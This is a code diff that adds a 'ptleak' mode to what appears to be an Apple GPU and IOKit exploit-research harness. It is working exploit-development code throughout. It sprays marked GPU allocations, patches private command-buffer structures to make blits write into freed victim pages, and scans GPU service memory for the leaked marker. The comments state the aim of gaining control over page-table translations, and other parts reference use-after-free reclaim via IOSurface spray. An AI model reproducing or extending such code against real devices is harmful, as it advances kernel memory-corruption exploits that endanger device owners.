@@ -18823,6 +18823,232 @@ static void p_s27down(void) {
     LOG("[s27d] done (alive), cases %ld", caseidx);
 }
 
+// V114: ptleak — leak-back channel test. The S4 spray releases GPU resources
+// with marked content into the kernel allocator (stale-TLB writes the marker
+// into freed pages). v90/v91 showed fresh Metal contexts receive service GPU
+// pages with uncleared leftovers readable by a GPU read-probe (source-patch
+// blit via gscan2_one). Hypothesis: our marked freed pages get redistributed
+// into GPU-internal structures (service pages / page tables) and show up in
+// probes of the service region — a leak-back channel (and if a marked page
+// became a PT page, its content = control over translations).
+// Modes (value of FUZZ_PTLEAK):
+//   spray     — one powerful marked spray block (S4 mechanics), then a
+//               deliberate SIGSEGV so the NEXT launch scans a fresh process
+//   scan      — fresh process: GPU read-probes over the v90 service region,
+//               hunting the marker qword (*** LEAK-BACK HIT ***)
+//   sprayscan — spray (no crash) + scan in the same process (control)
+// Env: FUZZ_PTLEAK_SKIP (probe resume), FUZZ_PTLEAK_CHURN (PT-churn period,
+// default 6 probes). v90-FATAL addresses are never probed. Tag [ptl].
+static void p_ptleak(void) {
+    const char *mode = getenv("FUZZ_PTLEAK") ?: "scan";
+    long skip = atol(getenv("FUZZ_PTLEAK_SKIP") ?: "0");
+    int churnk = atoi(getenv("FUZZ_PTLEAK_CHURN") ?: "6");
+    int dospray = !strcmp(mode, "spray") || !strcmp(mode, "sprayscan");
+    int doscan = !strcmp(mode, "scan") || !strcmp(mode, "sprayscan");
+    LOG("[ptl] v114 ptleak mode %s skip %ld churn %d", mode, skip, churnk);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) return;
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    LOG("[ptl] mconn 0x%x", mconn);
+    if (!mq || !mconn) return;
+
+    if (dospray) {
+        const uint64_t MK = 0x535445454c454b43ULL;   // marker qword
+        const int nv = 8, vsz = 0x100000;
+        LOG("[ptl] spray block: cong 8x16MB, %d victims x 0x%x, marker 0x%llx, fill 0x43",
+            nv, vsz, MK);
+        // congestion FIRST, committed before any raw alloc
+        id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+        memset([cgS contents], 0x55, 0x1000000);
+        for (int i = 0; i < 8; i++) {
+            id<MTLCommandBuffer> cbx = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> encx = [cbx blitCommandEncoder];
+            [encx copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+            [encx endEncoding];
+            [cbx commit];
+        }
+        // victims, strictly sequential (each top-of-stack)
+        uint32_t vr[8];
+        uint64_t vg[8];
+        uint8_t *vc[8];
+        int nvv = 0;
+        for (int v = 0; v < nv; v++) {
+            vr[nvv] = gpu_resource2(mconn, vsz, &vg[nvv], &vc[nvv]);
+            if (!vr[nvv] || !vc[nvv]) break;
+            memset(vc[nvv], 0, vsz);
+            LOG("[ptl] victim[%d] rid %u gpuva 0x%llx", v, vr[nvv], vg[nvv]);
+            nvv++;
+        }
+        // source A: marker page pattern over vsz/0x4000 16KB pages
+        id<MTLBuffer> bufA = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+        uint8_t *pa = (uint8_t *)[bufA contents];
+        for (int pg = 0; pg < vsz / 0x4000; pg++) {
+            memset(pa + pg * 0x4000, 0x43, 0x4000);
+            *(uint64_t *)(pa + pg * 0x4000) = MK;
+            *(uint64_t *)(pa + pg * 0x4000 + 8) = ((uint64_t)pg << 8);
+        }
+        // NV blits, own bufD each, patched to own victim
+        id<MTLBuffer> bd[8];
+        int nb = 0;
+        uint32_t skb = (uint32_t)(vsz >> 10);
+        for (int v = 0; v < nvv; v++) {
+            bd[nb] = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+            if (!bd[nb]) break;
+            id<MTLCommandBuffer> cb = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+            [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bd[nb] destinationOffset:0 size:vsz];
+            [enc endEncoding];
+            uint64_t gpuD = [bd[nb] gpuAddress];
+            long np;
+            if (nb == 0) {
+                gscan_patch(gpuD, gpuD);          // cache build, no-op write
+                np = gscan_patch(gpuD, vg[v]);
+            } else {
+                np = gscan_patch(gpuD, vg[v]);
+                if (!np) { gscan_patch(gpuD, gpuD); np = gscan_patch(gpuD, vg[v]); }
+            }
+            void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+            uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+            int ridp = 0;
+            if (sva) {
+                uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+                for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                    if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                        *(uint32_t *)(sg + o + 0x18) == skb && *(uint32_t *)(sg + o + 0x1c) == skb) {
+                        *(uint32_t *)(sg + o + 0x04) = vr[v];
+                        ridp = 1;
+                    }
+                }
+            }
+            [cb commit];
+            LOG("[ptl] blit[%d] slots %ld ridp %d", nb, np, ridp);
+            nb++;
+        }
+        // destroy all + one junk flush; NO reclaim wave
+        fsync(fileno(stderr));
+        kern_return_t kd0 = 0;
+        for (int v = 0; v < nvv; v++) {
+            kern_return_t kd = ioconnect_trap1(mconn, 1, vr[v]);
+            if (v == 0) kd0 = kd;
+        }
+        int nj = 0;
+        for (int i = 0; i < 40; i++) {
+            uint64_t gj; uint8_t *pj;
+            uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+            if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
+        }
+        LOG("[ptl] spray done: nvv %d ncb %d destroy0 kr 0x%08x nj %d", nvv, nb, kd0, nj);
+        if (!strcmp(mode, "spray")) {
+            LOG("[ptl] deliberate SIGSEGV now — relaunch with FUZZ_PTLEAK=scan");
+            fsync(fileno(stderr));
+            *(volatile uint8_t *)0 = 0x43;
+        }
+    }
+
+    if (doscan) {
+        id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+        if (!bufA || !bufB) return;
+        memset([bufA contents], 0x41, 0x10000);
+        memset([bufB contents], 0, 0x10000);
+        uint64_t gpuA = [bufA gpuAddress];
+        uint64_t gpuB = [bufB gpuAddress];
+        g_srcx = gpuA ^ 0x5a5a5a5a5a5a5a5aULL;
+        g_dstx = gpuB ^ 0x5a5a5a5a5a5a5a5aULL;
+        LOG("[ptl] gpuA 0x%llx gpuB 0x%llx", gpuA, gpuB);
+        static const uint64_t fatal[] = { 0x100004000ULL, 0x40000ULL, 0x100014c000ULL };
+        static long pidx;
+        pidx = 0;
+        // v90 probe block, verbatim discipline (p_gpuvmscan probe): gpuA/gpuB
+        // are by-value block locals, x is computed arithmetically, EVERY probe
+        // encodes a FRESH cb (the new slots re-embed gpuA, the patch hits
+        // them), gscan_patch(gpuA, x) with NO restore — restore and the
+        // xor-recompute of targets were exactly what blinded the loop
+        // (run-ptleak-scan2). The first call builds the gscan_patch cache
+        // (gpuA->gpuA no-op, v91 lesson built in)
+        int (^probe)(uint64_t, const char *) = ^int(uint64_t x, const char *tag) {
+            pidx++;
+            if (pidx <= skip) return 0;
+            LOG("[ptl] #%ld X 0x%llx (%s) ... (PANIC possible)", pidx, x, tag);
+            fsync(fileno(stderr));
+            id<MTLCommandBuffer> cb = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+            [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+            [enc endEncoding];
+            long np = gscan_patch(gpuA, x);
+            memset([bufB contents], 0, 0x10000);
+            @try {
+                [cb commit];
+                [cb waitUntilCompleted];
+            } @catch (NSException *ex) {
+                LOG("[ptl] #%ld X 0x%llx (%s) EXCEPTION %s", pidx, x, tag, [[ex name] UTF8String]);
+                return 0;
+            }
+            uint8_t *bb = (uint8_t *)[bufB contents];
+            long nz = 0, a41 = 0, mk = 0;
+            size_t moff = 0;
+            for (long i = 0; i < 0x10000; i++) { if (bb[i]) nz++; if (bb[i] == 0x41) a41++; }
+            for (size_t o = 0; o + 8 <= 0x10000; o += 8)
+                if (*(uint64_t *)(bb + o) == 0x535445454c454b43ULL) { if (!mk) moff = o; mk++; }
+            LOG("[ptl] #%ld X 0x%llx (%s) -> slots %ld | B nz %ld 41 %ld marker %ld %s",
+                pidx, x, tag, np, nz, a41, mk,
+                np == 0 ? "NOPATCH!" : mk ? "*** LEAK-BACK HIT ***"
+                     : (a41 > 0x8000 ? "A-passthrough" : (nz ? "data" : "zero")));
+            if (mk)
+                LOG("[ptl] *** LEAK-BACK HIT *** X 0x%llx off 0x%zx count %ld", x, moff, mk);
+            return mk > 0;
+        };
+        // calibration first — it IS the A-passthrough control (0x41 expected)
+        int hits = 0;
+        probe(gpuA, "calib-self");
+        // target sweep, computed arithmetically — never stored raw in memory
+        for (uint64_t x = 0x10000c000ULL; x < 0x100044000ULL; x += 0x4000ULL) {
+            int isfatal = 0;
+            for (unsigned i = 0; i < sizeof(fatal)/sizeof(fatal[0]); i++)
+                if (x == fatal[i]) isfatal = 1;
+            if (isfatal) { pidx++; LOG("[ptl] #%ld X 0x%llx SKIPPED (v90-fatal)", pidx, x); continue; }
+            hits += probe(x, "range");
+            if (churnk > 0 && pidx % churnk == 0) {
+                int n = 0;
+                uint32_t cr[512];
+                for (int i = 0; i < 500; i++) {
+                    uint64_t g; uint8_t *p;
+                    uint32_t r = gpu_resource2(mconn, 0x1000, &g, &p);
+                    if (r && n < 512) cr[n++] = r;
+                }
+                for (int i = 0; i < n; i++) ioconnect_trap1(mconn, 1, cr[i]);
+                LOG("[ptl] #%ld PT churn: %d tiny resources", pidx, n);
+            }
+            usleep(5000);
+        }
+        static const uint64_t extra[] = { 0x1000110000ULL, 0x1000120000ULL,
+                                          0x1000000000ULL, 0x1000004000ULL };
+        for (unsigned i = 0; i < sizeof(extra)/sizeof(extra[0]); i++) {
+            int isfatal = 0;
+            for (unsigned j = 0; j < sizeof(fatal)/sizeof(fatal[0]); j++)
+                if (extra[i] == fatal[j]) isfatal = 1;
+            if (isfatal) { pidx++; LOG("[ptl] #%ld X 0x%llx SKIPPED (v90-fatal)", pidx, extra[i]); continue; }
+            hits += probe(extra[i], "extra");
+            usleep(5000);
+        }
+        // final degradation check: passthrough must STILL read 0x41
+        probe(gpuA, "final-recheck");
+        {
+            uint8_t *bb = (uint8_t *)[bufB contents];
+            long a41 = 0;
+            for (long i = 0; i < 0x10000; i++) if (bb[i] == 0x41) a41++;
+            LOG("[ptl] final-recheck a41 %ld/0x10000 %s", a41,
+                a41 > 0x8000 ? "ok" : "*** SCAN-DEGRADED ***");
+        }
+        LOG("[ptl] scan done: %ld probes, %d marker hits", pidx - skip, hits);
+    }
+    LOG("[ptl] done (alive)");
+}
+
 // V110: (A) reclaim UAF pages via IOSurface spray; (B) deep IOSurface fuzz
 // (sel9 manual IOCFSerialize binary blobs, sel27 bulk-attachment frames).
 #include <IOKit/IOCFSerialize.h>
@@ -19109,6 +19335,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_CORESURF")) { p_coresurf(); LOG("[probe13] coresurf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IOSURFDEEP")) { p_iosurfdeep(); LOG("[probe13] iosurfdeep-only mode, stop"); return NULL; }
         if (getenv("FUZZ_S27DOWN")) { p_s27down(); LOG("[probe13] s27down-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_PTLEAK")) { p_ptleak(); LOG("[probe13] ptleak-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
